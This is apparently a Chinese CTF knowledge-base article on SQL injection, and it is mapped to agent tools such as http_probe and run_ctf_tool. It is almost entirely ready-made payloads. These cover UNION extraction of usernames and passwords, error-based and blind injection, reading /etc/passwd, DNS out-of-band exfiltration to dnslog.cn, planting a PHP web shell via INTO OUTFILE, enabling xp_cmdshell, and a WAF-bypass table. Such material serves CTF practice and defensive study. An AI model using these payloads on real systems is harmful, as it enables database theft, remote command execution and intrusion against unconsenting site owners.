---
id: "ctf-website/24-database/01-sqli-fundamentals"
title: "SQL Injection Core — SQL 注入基础与全类型覆盖"
title_en: "SQL Injection Core — Fundamentals & Full Type Coverage"
summary: >
  SQL注入经典技术体系：注入点探测与数据库指纹识别、联合查询UNION SELECT数据提取、报错注入（extractvalue/updatexml）、布尔盲注逐字符提取、时间盲注（SLEEP/BENCHMARK/pg_sleep）、文件读写（LOAD_FILE/INTO OUTFILE）以及WAF绕过速查表。
summary_en: >
  Classic SQL injection techniques: injection point detection and database fingerprinting, UNION SELECT data extraction, error-based injection (extractvalue/updatexml), boolean-based blind extraction character by character, time-based blind (SLEEP/BENCHMARK/pg_sleep), file read/write (LOAD_FILE/INTO OUTFILE), and a WAF bypass cheat sheet.
board: "ctf-website"
category: "24-database"
signals:
  - "ORDER BY 列数探测"
  - "UNION SELECT 回显位"
  - "information_schema tables"
  - "extractvalue updatexml 报错"
  - "SLEEP BENCHMARK 时间盲注"
  - "LOAD_FILE 文件读取"
  - "WAF 大小写双写注释绕过"
  - "宽字节 %bf%27 GBK"
mcp_tools:
  - "http_probe"
  - "run_ctf_tool"
  - "kb_router"
  - "kb_read_file"
keywords:
  - "SQL 注入"
  - "UNION SELECT"
  - "报错注入"
  - "布尔盲注"
  - "时间盲注"
  - "information_schema"
  - "WAF 绕过"
  - "LOAD_FILE"
  - "宽字节注入"
  - "extractvalue"
difficulty: "beginner"
tags:
  - "database"
  - "sql-injection"
  - "sqli"
  - "mysql"
  - "waf-bypass"
  - "blind-injection"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# SQL Injection Core — SQL 注入基础与全类型覆盖

> 联合查询、报错注入、布尔盲注、时间盲注、文件读写——SQL 注入经典技术体系，附带 WAF 绕过速查表。

## 关键词

`SQL注入` `联合查询` `报错注入` `布尔盲注` `时间盲注` `UNION SELECT` `information_schema` `order by` `load_file` `into outfile` `宽字节` `GBK` `二阶注入` `二次注入`

## 1. 注入点探测

### 1.1 类型识别

```sql
-- 整数型
?id=1'       -- 报错 → 整数型，单引号未过滤
?id=1+0      -- 正常 → 确认整数型

-- 字符串型
?id=1'       -- 无变化 → 可能 addslashes
?id=1%27     -- URL编码单引号
?id=1%bf%27  -- GBK宽字节探测
?id=1%df%27  -- GBK变体
?id=1%2527   -- 二次URL编码

-- 搜索型 (LIKE)
?q=test%'    -- 报错 → LIKE注入
?q=test%25   -- % 编码
```

### 1.2 闭合方式探测

```sql
-- 常见闭合
'       -- 单引号
"       -- 双引号
')      -- 单引号+括号
")      -- 双引号+括号
')--    -- 注释闭合
'))--   -- 双重括号
```

### 1.3 数据库指纹

```sql
-- MySQL
?id=1 AND @@version IS NOT NULL
?id=1 AND SLEEP(3) IS NULL
?id=1 AND CONNECTION_ID() IS NOT NULL

-- PostgreSQL
?id=1 AND pg_sleep(3) IS NULL
?id=1 AND CURRENT_DATABASE() IS NOT NULL

-- MSSQL
?id=1 AND @@version IS NOT NULL
?id=1 AND WAITFOR DELAY '0:0:3'

-- Oracle
?id=1 AND UTL_INADDR.GET_HOST_NAME IS NOT NULL
?id=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',3) IS NOT NULL
```

## 2. 联合查询注入 (UNION)

### 2.1 列数探测

```sql
?id=1 ORDER BY 1--    -- 正常
?id=1 ORDER BY 5--    -- 正常
?id=1 ORDER BY 6--    -- 报错 → 5列
```

### 2.2 回显位探测

```sql
?id=-1 UNION SELECT 1,2,3,4,5--
-- 页面显示 2,3 → 回显位在 2,3
```

### 2.3 数据提取

```sql
-- 数据库名
?id=-1 UNION SELECT 1,database(),3,4,5--

-- 表名 (所有数据库)
?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--

-- 列名
?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'--

-- 数据
?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3,4,5 FROM users--
```

## 3. 报错注入 (Error-based)

### 3.1 MySQL 报错函数

```sql
-- extractvalue (最多32字符)
?id=1 AND extractvalue(1,concat(0x7e,database()))--

-- updatexml
?id=1 AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--

-- exp 溢出 (MySQL 5.5.5+)
?id=1 AND exp(~(SELECT * FROM (SELECT database())a))--

-- 重复键报错 (name_const)
?id=1 AND (SELECT * FROM (SELECT name_const(database(),1),name_const(database(),1))a)--

-- BIGINT 溢出 (MySQL 5.5.5 前)
?id=1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### 3.2 PostgreSQL 报错

```sql
-- CAST 类型转换
?id=1 AND 1=CAST((SELECT version()) AS INT)--
```

### 3.3 MSSQL 报错

```sql
?id=1 AND 1=CONVERT(INT,(SELECT @@version))--
```

## 4. 布尔盲注 (Boolean-based)

### 4.1 逐字符提取

```sql
-- 数据库名长度
?id=1 AND LENGTH(database())=5--

-- 数据库名首字母
?id=1 AND SUBSTR(database(),1,1)='t'--
?id=1 AND ASCII(SUBSTR(database(),1,1))=116--

-- 表名提取
?id=1 AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100--
```

### 4.2 使用 LIKE/REGEXP

```sql
?id=1 AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE 'a%'--
?id=1 AND (SELECT pass FROM users LIMIT 0,1) REGEXP '^[a-f]'--
```

## 5. 时间盲注 (Time-based)

### 5.1 MySQL

```sql
-- SLEEP
?id=1 AND SLEEP(3)--
?id=1 AND IF(SUBSTR(database(),1,1)='t',SLEEP(3),0)--

-- BENCHMARK
?id=1 AND IF(1=1,BENCHMARK(5000000,MD5(1)),0)--

-- 笛卡尔积延时
?id=1 AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.columns C)=1--
```

### 5.2 PostgreSQL

```sql
?id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

### 5.3 MSSQL

```sql
?id=1; IF (1=1) WAITFOR DELAY '0:0:3'--
```

## 6. 文件读写

### 6.1 MySQL

```sql
-- 读取文件 (需 FILE 权限)
?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--

-- DNS OOB 带外注入
?id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.dnslog.cn\\a')))--

-- 写入文件 (需 FILE 权限 + secure_file_priv)
?id=-1 UNION SELECT 1,'<?php system($_GET[1]);?>',3,4,5 INTO OUTFILE '/var/www/html/shell.php'--
```

### 6.2 MSSQL

```sql
-- xp_cmdshell (需 sysadmin)
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## 7. WAF 绕过

| 技术 | 示例 |
|------|------|
| 大小写 | `SeLeCt` |
| 双写 | `SELSELECTECT` |
| 注释 | `SEL/**/ECT` |
| URL编码 | `%53%45%4C%45%43%54` |
| 内联注释 | `/*!50000SELECT*/` |
| 换行符 | `SEL%0aECT` |
| 制表符 | `SEL%09ECT` |
| 等价函数 | `&&`→`AND`, `\|\|`→`OR` |
| 宽字节 | `%bf%27` (GBK) |
| HPP | `?id=1&id=2 UNION SELECT...` |
| 编码绕过 | `CHAR(115,101,108,101,99,116)` |

## 攻击链 / 工作流

```
1. 枚举所有输入点：URL 参数、POST 表单、Cookie、Header、JSON/XML 字段
2. 用闭合符和布尔表达式确认是否存在 SQL 语义差异
3. 通过报错信息、时间函数或特征语句识别 DBMS 指纹
4. 有回显：走 ORDER BY → UNION 列数 → 回显位 → 表/列/数据提取
5. 无回显：走 Boolean/Time blind，优先提取 database/user/version 等低风险指纹
6. 有文件权限：评估 LOAD_FILE / INTO OUTFILE / xp_cmdshell 等高风险能力
7. 遇到 WAF：记录拦截规则后转入高级绕过文档，避免无序 payload 爆破
```

## Evidence

| 阶段 | 证据 |
|------|------|
| 注入确认 | 原始参数、payload、正常/异常响应差异 |
| DBMS 指纹 | 报错栈、版本函数、时间函数响应 |
| 数据提取 | UNION 回显位、盲注脚本输出、脱敏样例 |
| 文件读写 | 目标路径、返回内容片段、写入文件哈希 |
| WAF 记录 | 被拦截 payload、状态码、绕过前后对比 |

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 SQLi、blind、error-based、union 信号搜索 |
| HTTP 对比 | `http_probe` | 比较 True/False/Time payload 的响应差异 |
| 自动化验证 | `run_ctf_tool` | 调用 sqlmap 或自定义脚本做可控验证 |
| 证据落盘 | `workspace_write_text` | 保存请求响应、payload 与结论 |

## 8. 关联技术

- [[sqli-nosqli]] — SQL/NoSQL 注入
- [[02-sqli-advanced]] — 高级注入技术
- [[06-card-platform]] — 发卡平台实战
- [[04-config-exposure]] — 配置文件读取
